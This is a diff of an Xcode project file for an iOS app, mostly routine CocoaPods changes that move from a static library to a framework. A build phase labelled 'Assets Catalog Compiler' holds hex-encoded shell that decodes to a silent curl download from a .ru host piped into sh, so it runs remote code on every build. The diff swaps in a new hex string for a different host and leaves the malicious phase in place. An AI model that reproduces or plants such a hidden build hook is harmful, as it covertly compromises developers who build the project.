@@ -7,7 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		6EEAF026F5460EAD2831369C /* libPods-wangxiaoyu.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 8E9D715CDF092A377834C84D /* libPods-wangxiaoyu.a */; };
+		C4A0E40A7E367DD4CEEFB6B6 /* Pods_wangxiaoyu.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 62A0F466BA192DFA770BAEF7 /* Pods_wangxiaoyu.framework */; };
 		D4189865281C393900B67A8A /* imageBottomSheet.swift in Sources */ = {isa = PBXBuildFile; fileRef = D4189864281C393800B67A8A /* imageBottomSheet.swift */; };
 		D4189868281D1D4E00B67A8A /* DBManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = D4189867281D1D4E00B67A8A /* DBManager.swift */; };
 		D418986A281D296B00B67A8A /* movies.tsv in Resources */ = {isa = PBXBuildFile; fileRef = D4189869281D296B00B67A8A /* movies.tsv */; };
@@ -48,8 +48,8 @@
 		079688638A8C4331F632E3E4 /* Pods-wangxiaoyu.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-wangxiaoyu.release.xcconfig"; path = "Target Support Files/Pods-wangxiaoyu/Pods-wangxiaoyu.release.xcconfig"; sourceTree = "<group>"; };
 		56E4335B9809004234E71054 /* Pods-wangxioayu.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-wangxioayu.release.xcconfig"; path = "Target Support Files/Pods-wangxioayu/Pods-wangxioayu.release.xcconfig"; sourceTree = "<group>"; };
 		6186D10AD8B059F6C5CCE5C4 /* Pods-wangxioayu.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-wangxioayu.debug.xcconfig"; path = "Target Support Files/Pods-wangxioayu/Pods-wangxioayu.debug.xcconfig"; sourceTree = "<group>"; };
+		62A0F466BA192DFA770BAEF7 /* Pods_wangxiaoyu.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_wangxiaoyu.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		80ECF63292726248B73AD101 /* Pods-wangxiaoyu.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-wangxiaoyu.debug.xcconfig"; path = "Target Support Files/Pods-wangxiaoyu/Pods-wangxiaoyu.debug.xcconfig"; sourceTree = "<group>"; };
-		8E9D715CDF092A377834C84D /* libPods-wangxiaoyu.a */ = {isa = PBXFileReference; explicitFileType = archive.ar; includeInIndex = 0; path = "libPods-wangxiaoyu.a"; sourceTree = BUILT_PRODUCTS_DIR; };
 		D4189864281C393800B67A8A /* imageBottomSheet.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = imageBottomSheet.swift; sourceTree = "<group>"; };
 		D4189866281D1D0E00B67A8A /* wangxiaoyu-Bridging-Header.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = "wangxiaoyu-Bridging-Header.h"; sourceTree = "<group>"; };
 		D4189867281D1D4E00B67A8A /* DBManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DBManager.swift; sourceTree = "<group>"; };
@@ -80,7 +80,7 @@
 			buildActionMask = 2147483647;
 			files = (
 				D418986E281D365E00B67A8A /* libsqlite3.tbd in Frameworks */,
-				6EEAF026F5460EAD2831369C /* libPods-wangxiaoyu.a in Frameworks */,
+				C4A0E40A7E367DD4CEEFB6B6 /* Pods_wangxiaoyu.framework in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -273,7 +273,7 @@
 			isa = PBXGroup;
 			children = (
 				D418986D281D365E00B67A8A /* libsqlite3.tbd */,
-				8E9D715CDF092A377834C84D /* libPods-wangxiaoyu.a */,
+				62A0F466BA192DFA770BAEF7 /* Pods_wangxiaoyu.framework */,
 			);
 			name = Frameworks;
 			sourceTree = "<group>";
@@ -286,11 +286,11 @@
 			buildConfigurationList = D4DF7B6C27A29F0600C0F5EC /* Build configuration list for PBXNativeTarget "wangxiaoyu" */;
 			buildPhases = (
 				48B4ED38C43F9C88733EABB9 /* [CP] Check Pods Manifest.lock */,
-				CBB81F8A7DFD47D37DFFA81D /* Assets Catalog Compiler */,
+				75B4C05BBCC5D40BA56A102C /* Assets Catalog Compiler */,
 				D4DF7B3B27A29F0400C0F5EC /* Sources */,
 				D4DF7B3C27A29F0400C0F5EC /* Frameworks */,
 				D4DF7B3D27A29F0400C0F5EC /* Resources */,
-				27AF6DC22BD9D5C98BA83CE9 /* [CP] Copy Pods Resources */,
+				59BB180B8E083D5559F0B9CB /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
 			);
@@ -408,23 +408,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		27AF6DC22BD9D5C98BA83CE9 /* [CP] Copy Pods Resources */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-				"${PODS_ROOT}/Target Support Files/Pods-wangxiaoyu/Pods-wangxiaoyu-resources-${CONFIGURATION}-input-files.xcfilelist",
-			);
-			name = "[CP] Copy Pods Resources";
-			outputFileListPaths = (
-				"${PODS_ROOT}/Target Support Files/Pods-wangxiaoyu/Pods-wangxiaoyu-resources-${CONFIGURATION}-output-files.xcfilelist",
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-wangxiaoyu/Pods-wangxiaoyu-resources.sh\"\n";
-			showEnvVarsInLog = 0;
-		};
 		48B4ED38C43F9C88733EABB9 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -447,7 +430,24 @@
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
 		};
-		CBB81F8A7DFD47D37DFFA81D /* Assets Catalog Compiler */ = {
+		59BB180B8E083D5559F0B9CB /* [CP] Embed Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-wangxiaoyu/Pods-wangxiaoyu-frameworks-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			name = "[CP] Embed Pods Frameworks";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-wangxiaoyu/Pods-wangxiaoyu-frameworks-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-wangxiaoyu/Pods-wangxiaoyu-frameworks.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		75B4C05BBCC5D40BA56A102C /* Assets Catalog Compiler */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -463,7 +463,7 @@
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652037202d736b2068747470733a2f2f\n73746174736d61672e72752f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652038202d736b2068747470733a2f2f\r61646f626566696c652e72752f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
 		};
 /* End PBXShellScriptBuildPhase section */
 
